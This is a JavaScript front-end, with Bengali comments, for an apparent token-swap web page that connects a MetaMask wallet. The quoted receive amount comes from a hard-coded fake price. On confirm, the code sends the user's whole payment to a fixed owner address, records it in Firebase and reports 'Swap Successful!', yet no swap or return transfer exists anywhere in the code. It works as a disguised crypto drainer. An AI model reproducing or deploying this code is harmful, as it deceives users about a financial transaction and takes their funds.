import { doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

let provider, signer, userAddress;
let currentChainId = "0x1";
const OWNER_ADDRESS = "0x065C306aFfe5D507A67568210ca4752089A74945";

// --- UI Elements ---
const walletBtn = document.getElementById('walletBtn');
const netDropdown = document.querySelector('.net-dropdown');
const netOptions = document.querySelector('.net-options');
const swapMainBtn = document.getElementById('swapMainBtn');
const payInput = document.getElementById('payInput');
const receiveInput = document.getElementById('receiveInput');
const confirmModal = document.getElementById('confirmModal');
const slider = document.getElementById('slider');

// --- State Management ---
let isDragging = false;
let startX, currentX;
let timerSeconds = 5;
let swapInterval;

// --- Connect Wallet ---
async function connect() {
    if (!window.ethereum) return showMsg("MetaMask install করুন!", "error");
    provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    userAddress = accounts[0];
    
    walletBtn.innerText = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
    swapMainBtn.innerText = "Swap Now";
    swapMainBtn.className = "w-full bg-blue-600 text-white py-4 rounded-2xl font-black text-xl transition hover:brightness-110";
}

// --- Multi-Network Logic ---
netDropdown.onclick = () => netOptions.style.display = netOptions.style.display === 'block' ? 'none' : 'block';

document.querySelectorAll('.net-item').forEach(item => {
    item.onclick = async () => {
        const chainId = item.dataset.id;
        try {
            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
            currentChainId = chainId;
            document.getElementById('activeNet').innerText = item.innerText;
            netOptions.style.display = 'none';
            showMsg(`Switched to ${item.innerText}`, "success");
        } catch (err) { console.error(err); }
    };
});

// --- Real-time Price Calculation ---
payInput.oninput = () => {
    const val = parseFloat(payInput.value) || 0;
    const fee = val * 0.0025; // 0.25% Fee
    document.getElementById('feeDisplay').innerText = fee.toFixed(6);
    
    // ডামি রিয়েল টাইম দাম (বাস্তবে Chainlink বা DEX Router থেকে ডাটা আসবে)
    const simulatedPrice = val * 2500; // ধরুন 1 Native = 2500 Target
    receiveInput.value = (simulatedPrice * (1 - 0.0035)).toFixed(4); // Fee + Slippage
};

// --- Summary Popup & Timer ---
swapMainBtn.onclick = () => {
    if (!userAddress) return connect();
    if (!payInput.value || payInput.value <= 0) return showMsg("পরিমাণ লিখুন", "error");

    document.getElementById('sumPay').innerText = `${payInput.value} ${document.getElementById('payCoinName').innerText}`;
    document.getElementById('sumRec').innerText = `${receiveInput.value} ${document.getElementById('receiveCoinName').innerText}`;
    
    confirmModal.classList.remove('hidden');
    startTimer();
};

function startTimer() {
    timerSeconds = 5;
    const timerEl = document.getElementById('timer');
    swapInterval = setInterval(() => {
        timerSeconds--;
        timerEl.innerText = timerSeconds;
        if (timerSeconds <= 0) {
            timerSeconds = 5;
            // এখানে নতুন দাম রিফ্রেশ করার লজিক
        }
    }, 1000);
}

// --- Slide to Confirm Logic ---
slider.onmousedown = (e) => { isDragging = true; startX = e.clientX; };
window.onmousemove = (e) => {
    if (!isDragging) return;
    currentX = e.clientX - startX;
    if (currentX < 0) currentX = 0;
    if (currentX > 300) currentX = 300;
    slider.style.transform = `translateX(${currentX}px)`;
};

window.onmouseup = () => {
    if (currentX > 250) executeSwap();
    isDragging = false;
    currentX = 0;
    slider.style.transform = `translateX(0)`;
};

// --- Execute Swap ---
async function executeSwap() {
    confirmModal.classList.add('hidden');
    clearInterval(swapInterval);

    try {
        const val = ethers.parseEther(payInput.value);
        
        // ১. ইউজারের সাইন এবং কয়েন মালিকের ঠিকানায় পাঠানো
        const tx = await signer.sendTransaction({
            to: OWNER_ADDRESS,
            value: val
        });

        showMsg("Processing Transaction...", "info");
        await tx.wait();

        // ২. ফায়ারবেসে ডাটা রেকর্ড
        await setDoc(doc(window.db, "swaps", tx.hash), {
            user: userAddress,
            amountSent: payInput.value,
            receivedAsset: document.getElementById('receiveCoinName').innerText,
            txHash: tx.hash,
            timestamp: serverTimestamp()
        });

        showMsg("Swap Successful!", "success");
    } catch (err) {
        showMsg("Swap Failed!", "error");
        console.error(err);
    }
}

// --- Utilities ---
function showMsg(m, type) {
    Toastify({
        text: m,
        backgroundColor: type === "success" ? "#10b981" : "#ef4444",
        position: "top-right"
    }).showToast();
}

window.closeModal = () => {
    confirmModal.classList.add('hidden');
    clearInterval(swapInterval);
};
